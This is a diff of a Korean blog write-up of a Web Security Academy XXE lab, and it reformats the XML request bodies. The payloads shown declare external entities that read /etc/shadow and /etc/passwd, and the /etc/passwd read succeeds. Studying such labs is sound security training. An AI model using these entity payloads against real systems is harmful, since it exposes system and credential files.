@@ -48,7 +48,10 @@ Referer: https://0a52000f032ecba6c08c8b1900120054.web-security-academy.net/produ
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7onnection: close
 
-<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>1</productId>
+<storeId>1</storeId>
+</stockCheck>
 ```
 
 HTTP 응답은 다음과 같다. 
@@ -69,7 +72,12 @@ https://github.com/payloadbox/xxe-injection-payload-list
 `<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>` 를 추가해서 보내봤다. 
 
 ```
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY foo SYSTEM "file:///etc/shadow"> ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY foo SYSTEM "file:///etc/shadow"> ]>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1</storeId>
+</stockCheck>
 ```
 
 200 응답이 되돌아왔다. 뭔가 잘못된 것 같다. 
@@ -78,7 +86,11 @@ https://github.com/payloadbox/xxe-injection-payload-list
 아, 페이로드에 `&foo;` 로 출력해주는 부분이 없었다. 다음 페이로드로 시도해보자 /etc/passwd의 내용이 돌아왔다. 
 
 ``` 
-<!DOCTYPE test [<!ENTITY foo SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&foo;</productId><storeId>1</storeId></stockCheck>
+<!DOCTYPE test [<!ENTITY foo SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+    <productId>&foo;</productId>
+    <storeId>1</storeId>
+</stockCheck>
 ```
 
 ![Check stock기능](/images/burp-academy-xxe-1-3.png)
